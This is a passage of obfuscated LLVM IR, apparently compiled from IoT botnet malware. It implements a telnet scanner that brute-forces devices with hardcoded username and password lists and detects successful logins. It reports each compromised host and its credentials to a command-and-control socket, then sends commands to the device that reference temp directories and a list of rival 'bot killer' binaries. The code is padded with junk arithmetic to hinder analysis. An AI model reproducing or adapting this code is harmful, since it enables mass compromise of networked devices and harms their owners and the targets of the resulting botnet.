  %237 = icmp ne i32 %236, 115
  br i1 %237, label %238, label %242

; <label>:238:                                    ; preds = %234
  %239 = load i32, i32* %6, align 4
  %240 = sext i32 %239 to i64
  %241 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %240
  call void @reset_telstate(%struct.telstate_t* %241)
  br label %246

; <label>:242:                                    ; preds = %234, %209
  %243 = load i32, i32* %6, align 4
  %244 = sext i32 %243 to i64
  %245 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %244
  call void @advance_telstate(%struct.telstate_t* %245, i32 1)
  br label %246

; <label>:246:                                    ; preds = %242, %238
  br label %924

; <label>:247:                                    ; preds = %95
  br label %248

; <label>:248:                                    ; preds = %247
  %249 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %250 = getelementptr inbounds [16 x i64], [16 x i64]* %249, i64 0, i64 0
  %251 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %250) #5, !srcloc !5
  %252 = extractvalue { i64, i64* } %251, 0
  %253 = extractvalue { i64, i64* } %251, 1
  %254 = trunc i64 %252 to i32
  store i32 %254, i32* %21, align 4
  %255 = ptrtoint i64* %253 to i64
  %256 = trunc i64 %255 to i32
  store i32 %256, i32* %22, align 4
  br label %257

; <label>:257:                                    ; preds = %248
  br label %258

; <label>:258:                                    ; preds = %257
  %259 = load i32, i32* %6, align 4
  %260 = sext i32 %259 to i64
  %261 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %260
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %261, i32 0, i32 0
  %263 = load i32, i32* %262, align 16
  %264 = srem i32 %263, 64
  %265 = zext i32 %264 to i64
  %266 = shl i64 1, %265
  %267 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %12, i32 0, i32 0
  %268 = load i32, i32* %6, align 4
  %269 = sext i32 %268 to i64
  %270 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %269
  %271 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %270, i32 0, i32 0
  %272 = load i32, i32* %271, align 16
  %273 = sdiv i32 %272, 64
  %274 = sext i32 %273 to i64
  %275 = getelementptr inbounds [16 x i64], [16 x i64]* %267, i64 0, i64 %274
  %276 = load i64, i64* %275, align 8
  %277 = and i64 %276, %266
  %278 = xor i64 %276, %266
  %279 = or i64 %277, %278
  %280 = or i64 %276, %266
  store i64 %279, i64* %275, align 8
  %281 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 0
  store i64 0, i64* %281, align 8
  %282 = load i32, i32* %3, align 4
  %283 = sext i32 %282 to i64
  %284 = getelementptr inbounds %struct.timeval, %struct.timeval* %13, i32 0, i32 1
  store i64 %283, i64* %284, align 8
  %285 = load i32, i32* %6, align 4
  %286 = sext i32 %285 to i64
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %286
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 16
  %290 = sub i32 0, %289
  %291 = sub i32 0, 1
  %292 = add i32 %290, %291
  %293 = sub i32 0, %292
  %294 = add nsw i32 %289, 1
  %295 = call i32 @select(i32 %293, %struct.fd_set* null, %struct.fd_set* %12, %struct.fd_set* null, %struct.timeval* %13)
  store i32 %295, i32* %7, align 4
  %296 = load i32, i32* %7, align 4
  %297 = icmp eq i32 %296, 1
  br i1 %297, label %298, label %341

; <label>:298:                                    ; preds = %258
  %299 = load i32, i32* %6, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %300
  %302 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %301, i32 0, i32 7
  store i32 0, i32* %302, align 16
  store i32 4, i32* %14, align 4
  store i32 0, i32* %15, align 4
  %303 = load i32, i32* %6, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %304
  %306 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %305, i32 0, i32 0
  %307 = load i32, i32* %306, align 16
  %308 = bitcast i32* %15 to i8*
  %309 = call i32 @getsockopt(i32 %307, i32 1, i32 4, i8* %308, i32* %14) #5
  %310 = load i32, i32* %15, align 4
  %311 = icmp ne i32 %310, 0
  br i1 %311, label %312, label %316

; <label>:312:                                    ; preds = %298
  %313 = load i32, i32* %6, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %314
  call void @reset_telstate(%struct.telstate_t* %315)
  br label %340

; <label>:316:                                    ; preds = %298
  %317 = load i32, i32* %6, align 4
  %318 = sext i32 %317 to i64
  %319 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %318
  %320 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %319, i32 0, i32 0
  %321 = load i32, i32* %320, align 16
  %322 = load i32, i32* %6, align 4
  %323 = sext i32 %322 to i64
  %324 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %323
  %325 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %324, i32 0, i32 0
  %326 = load i32, i32* %325, align 16
  %327 = call i32 (i32, i32, ...) @fcntl(i32 %326, i32 3, i8* null)
  %328 = xor i32 %327, -1
  %329 = xor i32 -2049, -1
  %330 = xor i32 1262819745, -1
  %331 = or i32 %328, %329
  %332 = or i32 1262819745, %330
  %333 = xor i32 %331, -1
  %334 = and i32 %333, %332
  %335 = and i32 %327, -2049
  %336 = call i32 (i32, i32, ...) @fcntl(i32 %321, i32 4, i32 %334)
  %337 = load i32, i32* %6, align 4
  %338 = sext i32 %337 to i64
  %339 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %338
  call void @advance_telstate(%struct.telstate_t* %339, i32 2)
  br label %340

; <label>:340:                                    ; preds = %316, %312
  br label %925

; <label>:341:                                    ; preds = %258
  %342 = load i32, i32* %7, align 4
  %343 = icmp eq i32 %342, -1
  br i1 %343, label %344, label %348

; <label>:344:                                    ; preds = %341
  %345 = load i32, i32* %6, align 4
  %346 = sext i32 %345 to i64
  %347 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %346
  call void @reset_telstate(%struct.telstate_t* %347)
  br label %925

; <label>:348:                                    ; preds = %341
  br label %349

; <label>:349:                                    ; preds = %348
  %350 = load i32, i32* %6, align 4
  %351 = sext i32 %350 to i64
  %352 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %351
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %352, i32 0, i32 7
  %354 = load i32, i32* %353, align 16
  %355 = sub i32 0, %354
  %356 = sub i32 0, 7
  %357 = add i32 %355, %356
  %358 = sub i32 0, %357
  %359 = add i32 %354, 7
  %360 = zext i32 %358 to i64
  %361 = call i64 @time(i64* null) #5
  %362 = icmp slt i64 %360, %361
  br i1 %362, label %363, label %367

; <label>:363:                                    ; preds = %349
  %364 = load i32, i32* %6, align 4
  %365 = sext i32 %364 to i64
  %366 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %365
  call void @reset_telstate(%struct.telstate_t* %366)
  br label %367

; <label>:367:                                    ; preds = %363, %349
  br label %924

; <label>:368:                                    ; preds = %95
  %369 = load i32, i32* %6, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %370
  %372 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %371, i32 0, i32 0
  %373 = load i32, i32* %372, align 16
  %374 = load i32, i32* %3, align 4
  %375 = load i32, i32* %6, align 4
  %376 = sext i32 %375 to i64
  %377 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %376
  %378 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %377, i32 0, i32 9
  %379 = load i8*, i8** %378, align 8
  %380 = call i32 @read_until_response(i32 %373, i32 %374, i8* %379, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %381 = icmp ne i32 %380, 0
  br i1 %381, label %382, label %405

; <label>:382:                                    ; preds = %368
  %383 = call i64 @time(i64* null) #5
  %384 = trunc i64 %383 to i32
  %385 = load i32, i32* %6, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %386
  %388 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %387, i32 0, i32 7
  store i32 %384, i32* %388, align 16
  %389 = load i32, i32* %6, align 4
  %390 = sext i32 %389 to i64
  %391 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %390
  %392 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %391, i32 0, i32 9
  %393 = load i8*, i8** %392, align 8
  %394 = call i32 @contains_fail(i8* %393)
  %395 = icmp ne i32 %394, 0
  br i1 %395, label %396, label %400

; <label>:396:                                    ; preds = %382
  %397 = load i32, i32* %6, align 4
  %398 = sext i32 %397 to i64
  %399 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %398
  call void @advance_telstate(%struct.telstate_t* %399, i32 0)
  br label %404

; <label>:400:                                    ; preds = %382
  %401 = load i32, i32* %6, align 4
  %402 = sext i32 %401 to i64
  %403 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %402
  call void @advance_telstate(%struct.telstate_t* %403, i32 3)
  br label %404

; <label>:404:                                    ; preds = %400, %396
  br label %925

; <label>:405:                                    ; preds = %368
  %406 = load i32, i32* %6, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %407
  %409 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %408, i32 0, i32 7
  %410 = load i32, i32* %409, align 16
  %411 = sub i32 %410, -462746309
  %412 = add i32 %411, 7
  %413 = add i32 %412, -462746309
  %414 = add i32 %410, 7
  %415 = zext i32 %413 to i64
  %416 = call i64 @time(i64* null) #5
  %417 = icmp slt i64 %415, %416
  br i1 %417, label %418, label %422

; <label>:418:                                    ; preds = %405
  %419 = load i32, i32* %6, align 4
  %420 = sext i32 %419 to i64
  %421 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %420
  call void @reset_telstate(%struct.telstate_t* %421)
  br label %422

; <label>:422:                                    ; preds = %418, %405
  br label %924

; <label>:423:                                    ; preds = %95
  %424 = load i32, i32* %6, align 4
  %425 = sext i32 %424 to i64
  %426 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %425
  %427 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %426, i32 0, i32 0
  %428 = load i32, i32* %427, align 16
  %429 = load i32, i32* %6, align 4
  %430 = sext i32 %429 to i64
  %431 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %430
  %432 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %431, i32 0, i32 4
  %433 = load i8, i8* %432, align 2
  %434 = zext i8 %433 to i64
  %435 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %434
  %436 = load i8*, i8** %435, align 8
  %437 = load i32, i32* %6, align 4
  %438 = sext i32 %437 to i64
  %439 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %438
  %440 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %439, i32 0, i32 4
  %441 = load i8, i8* %440, align 2
  %442 = zext i8 %441 to i64
  %443 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %442
  %444 = load i8*, i8** %443, align 8
  %445 = call i64 @strlen(i8* %444) #9
  %446 = call i64 @send(i32 %428, i8* %436, i64 %445, i32 16384)
  %447 = icmp slt i64 %446, 0
  br i1 %447, label %448, label %452

; <label>:448:                                    ; preds = %423
  %449 = load i32, i32* %6, align 4
  %450 = sext i32 %449 to i64
  %451 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %450
  call void @reset_telstate(%struct.telstate_t* %451)
  br label %925

; <label>:452:                                    ; preds = %423
  %453 = load i32, i32* %6, align 4
  %454 = sext i32 %453 to i64
  %455 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %454
  %456 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %455, i32 0, i32 0
  %457 = load i32, i32* %456, align 16
  %458 = call i64 @send(i32 %457, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %459 = icmp slt i64 %458, 0
  br i1 %459, label %460, label %464

; <label>:460:                                    ; preds = %452
  %461 = load i32, i32* %6, align 4
  %462 = sext i32 %461 to i64
  %463 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %462
  call void @reset_telstate(%struct.telstate_t* %463)
  br label %925

; <label>:464:                                    ; preds = %452
  %465 = load i32, i32* %6, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %466
  call void @advance_telstate(%struct.telstate_t* %467, i32 4)
  br label %924

; <label>:468:                                    ; preds = %95
  %469 = load i32, i32* %6, align 4
  %470 = sext i32 %469 to i64
  %471 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %470
  %472 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %471, i32 0, i32 0
  %473 = load i32, i32* %472, align 16
  %474 = load i32, i32* %3, align 4
  %475 = load i32, i32* %6, align 4
  %476 = sext i32 %475 to i64
  %477 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %476
  %478 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %477, i32 0, i32 9
  %479 = load i8*, i8** %478, align 8
  %480 = call i32 @read_until_response(i32 %473, i32 %474, i8* %479, i32 1024, i8** getelementptr inbounds ([16 x i8*], [16 x i8*]* @advances, i32 0, i32 0))
  %481 = icmp ne i32 %480, 0
  br i1 %481, label %482, label %505

; <label>:482:                                    ; preds = %468
  %483 = call i64 @time(i64* null) #5
  %484 = trunc i64 %483 to i32
  %485 = load i32, i32* %6, align 4
  %486 = sext i32 %485 to i64
  %487 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %486
  %488 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %487, i32 0, i32 7
  store i32 %484, i32* %488, align 16
  %489 = load i32, i32* %6, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %490
  %492 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %491, i32 0, i32 9
  %493 = load i8*, i8** %492, align 8
  %494 = call i32 @contains_fail(i8* %493)
  %495 = icmp ne i32 %494, 0
  br i1 %495, label %496, label %500

; <label>:496:                                    ; preds = %482
  %497 = load i32, i32* %6, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %498
  call void @advance_telstate(%struct.telstate_t* %499, i32 0)
  br label %504

; <label>:500:                                    ; preds = %482
  %501 = load i32, i32* %6, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %502
  call void @advance_telstate(%struct.telstate_t* %503, i32 5)
  br label %504

; <label>:504:                                    ; preds = %500, %496
  br label %925

; <label>:505:                                    ; preds = %468
  %506 = load i32, i32* %6, align 4
  %507 = sext i32 %506 to i64
  %508 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %507
  %509 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %508, i32 0, i32 7
  %510 = load i32, i32* %509, align 16
  %511 = sub i32 0, 7
  %512 = sub i32 %510, %511
  %513 = add i32 %510, 7
  %514 = zext i32 %512 to i64
  %515 = call i64 @time(i64* null) #5
  %516 = icmp slt i64 %514, %515
  br i1 %516, label %517, label %521

; <label>:517:                                    ; preds = %505
  %518 = load i32, i32* %6, align 4
  %519 = sext i32 %518 to i64
  %520 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %519
  call void @reset_telstate(%struct.telstate_t* %520)
  br label %521

; <label>:521:                                    ; preds = %517, %505
  br label %924

; <label>:522:                                    ; preds = %95
  %523 = load i32, i32* %6, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %524
  %526 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %525, i32 0, i32 0
  %527 = load i32, i32* %526, align 16
  %528 = load i32, i32* %6, align 4
  %529 = sext i32 %528 to i64
  %530 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %529
  %531 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %530, i32 0, i32 5
  %532 = load i8, i8* %531, align 1
  %533 = zext i8 %532 to i64
  %534 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %533
  %535 = load i8*, i8** %534, align 8
  %536 = load i32, i32* %6, align 4
  %537 = sext i32 %536 to i64
  %538 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %537
  %539 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %538, i32 0, i32 5
  %540 = load i8, i8* %539, align 1
  %541 = zext i8 %540 to i64
  %542 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %541
  %543 = load i8*, i8** %542, align 8
  %544 = call i64 @strlen(i8* %543) #9
  %545 = call i64 @send(i32 %527, i8* %535, i64 %544, i32 16384)
  %546 = icmp slt i64 %545, 0
  br i1 %546, label %547, label %551

; <label>:547:                                    ; preds = %522
  %548 = load i32, i32* %6, align 4
  %549 = sext i32 %548 to i64
  %550 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %549
  call void @reset_telstate(%struct.telstate_t* %550)
  br label %925

; <label>:551:                                    ; preds = %522
  %552 = load i32, i32* %6, align 4
  %553 = sext i32 %552 to i64
  %554 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %553
  %555 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %554, i32 0, i32 0
  %556 = load i32, i32* %555, align 16
  %557 = call i64 @send(i32 %556, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.487, i32 0, i32 0), i64 2, i32 16384)
  %558 = icmp slt i64 %557, 0
  br i1 %558, label %559, label %563

; <label>:559:                                    ; preds = %551
  %560 = load i32, i32* %6, align 4
  %561 = sext i32 %560 to i64
  %562 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %561
  call void @reset_telstate(%struct.telstate_t* %562)
  br label %925

; <label>:563:                                    ; preds = %551
  %564 = load i32, i32* %6, align 4
  %565 = sext i32 %564 to i64
  %566 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %565
  call void @advance_telstate(%struct.telstate_t* %566, i32 6)
  br label %924

; <label>:567:                                    ; preds = %95
  %568 = load i32, i32* %6, align 4
  %569 = sext i32 %568 to i64
  %570 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %569
  %571 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %570, i32 0, i32 0
  %572 = load i32, i32* %571, align 16
  %573 = load i32, i32* %3, align 4
  %574 = load i32, i32* %6, align 4
  %575 = sext i32 %574 to i64
  %576 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %575
  %577 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %576, i32 0, i32 9
  %578 = load i8*, i8** %577, align 8
  %579 = call i32 @read_until_response(i32 %572, i32 %573, i8* %578, i32 1024, i8** getelementptr inbounds ([11 x i8*], [11 x i8*]* @advances2, i32 0, i32 0))
  %580 = icmp ne i32 %579, 0
  br i1 %580, label %581, label %652

; <label>:581:                                    ; preds = %567
  %582 = call i64 @time(i64* null) #5
  %583 = trunc i64 %582 to i32
  %584 = load i32, i32* %6, align 4
  %585 = sext i32 %584 to i64
  %586 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %585
  %587 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %586, i32 0, i32 7
  store i32 %583, i32* %587, align 16
  %588 = load i32, i32* %6, align 4
  %589 = sext i32 %588 to i64
  %590 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %589
  %591 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %590, i32 0, i32 9
  %592 = load i8*, i8** %591, align 8
  %593 = call i32 @contains_fail(i8* %592)
  %594 = icmp ne i32 %593, 0
  br i1 %594, label %595, label %599

; <label>:595:                                    ; preds = %581
  %596 = load i32, i32* %6, align 4
  %597 = sext i32 %596 to i64
  %598 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %597
  call void @advance_telstate(%struct.telstate_t* %598, i32 0)
  br label %651

; <label>:599:                                    ; preds = %581
  %600 = load i32, i32* %6, align 4
  %601 = sext i32 %600 to i64
  %602 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %601
  %603 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %602, i32 0, i32 9
  %604 = load i8*, i8** %603, align 8
  %605 = call i32 @contains_success(i8* %604)
  %606 = icmp ne i32 %605, 0
  br i1 %606, label %607, label %646

; <label>:607:                                    ; preds = %599
  %608 = load i32, i32* %6, align 4
  %609 = sext i32 %608 to i64
  %610 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %609
  %611 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %610, i32 0, i32 3
  %612 = load i8, i8* %611, align 1
  %613 = zext i8 %612 to i32
  %614 = icmp eq i32 %613, 2
  br i1 %614, label %615, label %619

; <label>:615:                                    ; preds = %607
  %616 = load i32, i32* %6, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %617
  call void @advance_telstate(%struct.telstate_t* %618, i32 7)
  br label %645

; <label>:619:                                    ; preds = %607
  %620 = load i32, i32* @mainCommSock, align 4
  %621 = load i32, i32* %6, align 4
  %622 = sext i32 %621 to i64
  %623 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %622
  %624 = call i8* @get_telstate_host(%struct.telstate_t* %623)
  %625 = load i32, i32* %6, align 4
  %626 = sext i32 %625 to i64
  %627 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %626
  %628 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %627, i32 0, i32 4
  %629 = load i8, i8* %628, align 2
  %630 = zext i8 %629 to i64
  %631 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %630
  %632 = load i8*, i8** %631, align 8
  %633 = load i32, i32* %6, align 4
  %634 = sext i32 %633 to i64
  %635 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %634
  %636 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %635, i32 0, i32 5
  %637 = load i8, i8* %636, align 1
  %638 = zext i8 %637 to i64
  %639 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %638
  %640 = load i8*, i8** %639, align 8
  %641 = call i32 (i32, i8*, ...) @sockprintf(i32 %620, i8* getelementptr inbounds ([72 x i8], [72 x i8]* @.str.488, i32 0, i32 0), i8* %624, i8* %632, i8* %640)
  %642 = load i32, i32* %6, align 4
  %643 = sext i32 %642 to i64
  %644 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %643
  call void @advance_telstate(%struct.telstate_t* %644, i32 7)
  br label %645

; <label>:645:                                    ; preds = %619, %615
  br label %650

; <label>:646:                                    ; preds = %599
  %647 = load i32, i32* %6, align 4
  %648 = sext i32 %647 to i64
  %649 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %648
  call void @reset_telstate(%struct.telstate_t* %649)
  br label %650

; <label>:650:                                    ; preds = %646, %645
  br label %651

; <label>:651:                                    ; preds = %650, %595
  br label %925

; <label>:652:                                    ; preds = %567
  %653 = load i32, i32* %6, align 4
  %654 = sext i32 %653 to i64
  %655 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %654
  %656 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %655, i32 0, i32 7
  %657 = load i32, i32* %656, align 16
  %658 = add i32 %657, -148923313
  %659 = add i32 %658, 7
  %660 = sub i32 %659, -148923313
  %661 = add i32 %657, 7
  %662 = zext i32 %660 to i64
  %663 = call i64 @time(i64* null) #5
  %664 = icmp slt i64 %662, %663
  br i1 %664, label %665, label %669

; <label>:665:                                    ; preds = %652
  %666 = load i32, i32* %6, align 4
  %667 = sext i32 %666 to i64
  %668 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %667
  call void @reset_telstate(%struct.telstate_t* %668)
  br label %669

; <label>:669:                                    ; preds = %665, %652
  br label %924

; <label>:670:                                    ; preds = %95
  %671 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %672 = call i32 (i8*, i8*, ...) @sprintf(i8* %671, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.489, i32 0, i32 0), i8** getelementptr inbounds ([13 x i8*], [13 x i8*]* @Temp_Directorys, i32 0, i32 0)) #5
  %673 = load i32, i32* %6, align 4
  %674 = sext i32 %673 to i64
  %675 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %674
  %676 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %675, i32 0, i32 0
  %677 = load i32, i32* %676, align 16
  %678 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %679 = getelementptr inbounds [80 x i8], [80 x i8]* %23, i32 0, i32 0
  %680 = call i64 @strlen(i8* %679) #9
  %681 = call i64 @send(i32 %677, i8* %678, i64 %680, i32 16384)
  %682 = icmp slt i64 %681, 0
  br i1 %682, label %683, label %687

; <label>:683:                                    ; preds = %670
  %684 = load i32, i32* %6, align 4
  %685 = sext i32 %684 to i64
  %686 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %685
  call void @reset_telstate(%struct.telstate_t* %686)
  br label %925

; <label>:687:                                    ; preds = %670
  call void @RemoveTempDirs()
  %688 = load i32, i32* @mainCommSock, align 4
  %689 = load i32, i32* %6, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %690
  %692 = call i8* @get_telstate_host(%struct.telstate_t* %691)
  %693 = load i32, i32* %6, align 4
  %694 = sext i32 %693 to i64
  %695 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %694
  %696 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %695, i32 0, i32 4
  %697 = load i8, i8* %696, align 2
  %698 = zext i8 %697 to i64
  %699 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Usernames, i64 0, i64 %698
  %700 = load i8*, i8** %699, align 8
  %701 = load i32, i32* %6, align 4
  %702 = sext i32 %701 to i64
  %703 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %702
  %704 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %703, i32 0, i32 5
  %705 = load i8, i8* %704, align 1
  %706 = zext i8 %705 to i64
  %707 = getelementptr inbounds [19 x i8*], [19 x i8*]* @Telnet_Passwords, i64 0, i64 %706
  %708 = load i8*, i8** %707, align 8
  %709 = call i32 (i32, i8*, ...) @sockprintf(i32 %688, i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.490, i32 0, i32 0), i8* %692, i8* %700, i8* %708)
  %710 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %711 = call i32 (i8*, i8*, ...) @sprintf(i8* %710, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.491, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0), i8** getelementptr inbounds ([355 x i8*], [355 x i8*]* @Bot_Killer_Binarys, i32 0, i32 0)) #5
  %712 = load i32, i32* %6, align 4
  %713 = sext i32 %712 to i64
  %714 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %713
  %715 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %714, i32 0, i32 0
  %716 = load i32, i32* %715, align 16
  %717 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %718 = getelementptr inbounds [80 x i8], [80 x i8]* %24, i32 0, i32 0
  %719 = call i64 @strlen(i8* %718) #9
  %720 = call i64 @send(i32 %716, i8* %717, i64 %719, i32 16384)
  %721 = icmp slt i64 %720, 0
  br i1 %721, label %722, label %726

; <label>:722:                                    ; preds = %687
  %723 = load i32, i32* %6, align 4
  %724 = sext i32 %723 to i64
  %725 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %724
  call void @reset_telstate(%struct.telstate_t* %725)
  br label %925

; <label>:726:                                    ; preds = %687
  %727 = load i32, i32* @mainCommSock, align 4
  %728 = load i32, i32* %6, align 4
  %729 = sext i32 %728 to i64
  %730 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %46, i64 %729
  %731 = call i8* @get_telstate_host(%struct.telstate_t* %730)
